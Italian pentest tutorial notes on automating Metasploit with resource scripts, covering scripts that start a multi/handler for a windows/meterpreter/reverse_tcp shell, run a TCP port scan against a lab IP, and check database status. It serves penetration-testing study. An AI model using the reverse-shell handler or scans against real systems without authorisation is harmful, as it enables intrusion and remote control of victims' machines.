# Automating Metasploit With Resource Scripts

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (980).png" alt=""><figcaption></figcaption></figure>

## Resource script già preconfigurati

```
ls -al /usr/share/metasploit-framework/scripts/resource/
```

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (981).png" alt=""><figcaption></figcaption></figure>

#### Ad esempio:

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (982).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (983).png" alt=""><figcaption></figcaption></figure>

## Creare resource script custom

### Creare uno script custom per automatizzare l'handler

```
vim handler.rc
    use multi/hadnler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 10.10.10.5
    set LPORT 1234
    run
msfconsole -r handler.rc
```

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (984).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (986).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (988).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (989).png" alt=""><figcaption></figcaption></figure>

### Creare un resource script per portscan

```
vim portscan.rc
    use auxiliary/scanner/portscan/tcp
    set RHOSTS 10.10.10.7
    run
msfconsole -r portscan.rc
```

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (990).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (991).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (992).png" alt=""><figcaption></figcaption></figure>

### Creare un resource script per controllare lo status di un DB

```
vim db_status.rc
    db_status
    workspace
    worspace -a Test
msfconsole -r db_status.rc
```

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (993).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (994).png" alt=""><figcaption></figcaption></figure>

## Caricare i resource script direttamente in msfconsole

```
msfconsole
resource /path/<NOME SCRIPT>.rc
```

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (995).png" alt=""><figcaption></figcaption></figure>

## Esportare i comandi eseguiti in un resource script

```
msfconsole
    use auxiliary/scanner/portscan/tcp
    set RHOSTS 10.10.10.7
    run
    makerc /PATH/portscan.rc
```

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (996).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../daniele-badagliacca-docs/docs/.gitbook/assets/image (997).png" alt=""><figcaption></figcaption></figure>

